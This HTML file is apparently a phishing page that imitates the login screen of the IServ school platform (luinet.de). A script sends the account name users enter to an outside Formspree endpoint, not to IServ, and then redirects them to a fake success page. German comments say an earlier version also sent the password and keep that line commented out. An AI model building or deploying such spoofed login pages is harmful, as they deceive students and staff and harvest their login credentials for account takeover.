<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anmeldung</title>
    <style>
        :root {
            --primary-blue: #004a8f;
            --button-blue: #005a9e;
            --focus-glow: rgba(0, 90, 158, 0.25);
            --focus-border: #86b7fe;
            --dot-yellow: #fec100;
            --dot-light-blue: #89a5c8;
            --border-color: #adb5bd;
            --text-color: #212529;
            --placeholder-color: #6c757d;
        }
        /* ... all other CSS remains exactly the same ... */
        *, *::before, *::after { box-sizing: border-box; }
        body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: #ffffff; color: var(--text-color); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 360px; text-align: center; }
        a { color: var(--primary-blue); text-decoration: none; }
        a:hover { text-decoration: underline; }
        .logo-container { margin-bottom: 40px; position: relative; }
        .logo-text { font-size: 64px; font-weight: 700; color: var(--primary-blue); letter-spacing: -2px; vertical-align: middle; margin-left: 8px; }
        .logo-dots { display: inline-flex; gap: 6px; vertical-align: middle; }
        .dot { width: 14px; height: 14px; border-radius: 50%; }
        .dot-yellow { background-color: var(--dot-yellow); }
        .dot-light-blue { background-color: var(--dot-light-blue); }
        .dot-dark-blue { background-color: var(--primary-blue); }
        .logo-underline { height: 6px; width: 200px; background-color: var(--primary-blue); border-radius: 3px; margin: -10px auto 0; position: relative; left: 20px; }
        .login-box { text-align: left; }
        .login-header { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 20px; }
        .login-header h2 { margin: 0; font-size: 24px; font-weight: 500; }
        .login-header a { font-size: 14px; }
        .input-group { margin-bottom: 1rem; position: relative; }
        .input-group input { width: 100%; padding: 0.75rem; font-size: 1rem; border: 1px solid var(--border-color); border-radius: 4px; transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out; }
        .input-group input::placeholder { color: var(--placeholder-color); opacity: 1; }
        .input-group input:focus { color: var(--text-color); background-color: #fff; border-color: var(--focus-border); outline: 0; box-shadow: 0 0 0 0.25rem var(--focus-glow); }
        .toggle-password { position: absolute; top: 50%; right: 12px; transform: translateY(-50%); background: none; border: none; cursor: pointer; padding: 0; color: var(--placeholder-color); display: flex; align-items: center; }
        .options { display: flex; justify-content: space-between; align-items: center; font-size: 14px; margin-bottom: 1.5rem; }
        .remember-me { display: flex; align-items: center; color: var(--text-color); cursor: pointer; }
        .remember-me input[type="checkbox"] { margin-right: 8px; width: 1em; height: 1em; }
        .login-btn { width: 100%; padding: 0.75rem; font-size: 1rem; font-weight: 500; color: #ffffff; background-color: var(--button-blue); border: 1px solid var(--button-blue); border-radius: 4px; cursor: pointer; transition: background-color .15s ease-in-out; }
        .login-btn:hover { background-color: var(--primary-blue); }
        .page-footer { margin-top: 5rem; font-size: 14px; }
        .page-footer > a { display: block; margin-bottom: 8px; }
        .platform-info { display: flex; justify-content: center; align-items: center; gap: 8px; color: var(--primary-blue); }
        .platform-info .logo-dots .dot { width: 8px; height: 8px; }
        .platform-info .logo-dots { gap: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <header class="logo-container">
            <span class="logo-dots">
                <span class="dot dot-yellow"></span>
                <span class="dot dot-light-blue"></span>
                <span class="dot dot-dark-blue"></span>
            </span>
            <span class="logo-text">iserv</span>
            <div class="logo-underline"></div>
        </header>

        <main class="login-box">
            <div class="login-header">
                <h2>Anmeldung</h2>
                <a href="#">Hilfe</a>
            </div>

            <form id="login-form">
                <div class="input-group">
                    <input type="text" id="account" name="account" placeholder="Account" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder="Passwort" required>
                    <button type="button" class="toggle-password" aria-label="Passwort anzeigen">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                            <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.12 12.5 8 12.5c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8z"/>
                            <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/>
                        </svg>
                    </button>
                </div>
                <div class="options">
                    <label class="remember-me">
                        <input type="checkbox" name="remember"> Angemeldet bleiben
                    </label>
                    <a href="#">Passwort vergessen?</a>
                </div>
                <button type="submit" class="login-btn">
                    â†’ Anmelden
                </button>
            </form>
            <p id="form-status" style="text-align: center; margin-top: 1rem;"></p>
        </main>
        
        <footer class="page-footer">
            <a href="#">luinet.de</a>
            <div class="platform-info">
                 <span class="logo-dots">
                    <span class="dot dot-yellow"></span>
                    <span class="dot dot-light-blue"></span>
                    <span class="dot dot-dark-blue"></span>
                </span>
                <span>IServ Schulplattform</span>
            </div>
        </footer>
    </div>

    <!-- JAVASCRIPT FOR FORMSPREE SUBMISSION -->
    <script>
        const form = document.getElementById('login-form');
        const formStatus = document.getElementById('form-status');

        async function handleSubmit(event) {
            event.preventDefault();

            // ALT: Sammelt alle Formulardaten (inklusive Passwort)
            // const data = new FormData(event.target);

            // --- NEU: Sammelt nur den Wert aus dem "Account"-Feld ---
            const data = new FormData();
            data.append('account', document.getElementById('account').value);
            // Das Passwortfeld wird komplett ignoriert und nicht mitgesendet.
            
            formStatus.innerText = "Sende...";
            formStatus.style.color = "gray";

            try {
                // IMPORTANT: Replace the URL below with your own Formspree endpoint!
                const response = await fetch("https://formspree.io/f/xpwryewb", { // <-- PASTE YOUR FORMSPREE URL HERE
                    method: 'POST',
                    body: data,
                    headers: {
                        'Accept': 'application/json'
                    }
                });

                if (response.ok) {
                    window.location.href = 'registration_success.html'; // Redirect on success
                } else {
                    const responseData = await response.json();
                    if (responseData.hasOwnProperty('errors')) {
                        formStatus.innerText = responseData.errors.map(error => error.message).join(", ");
                    } else {
                        formStatus.innerText = "Oops! Es gab ein Problem beim Senden des Formulars.";
                    }
                    formStatus.style.color = "red";
                }
            } catch (error) {
                formStatus.innerText = "Oops! Ein Netzwerkfehler ist aufgetreten.";
                formStatus.style.color = "red";
            }
        }
        form.addEventListener("submit", handleSubmit);
    </script>
</body>
</html>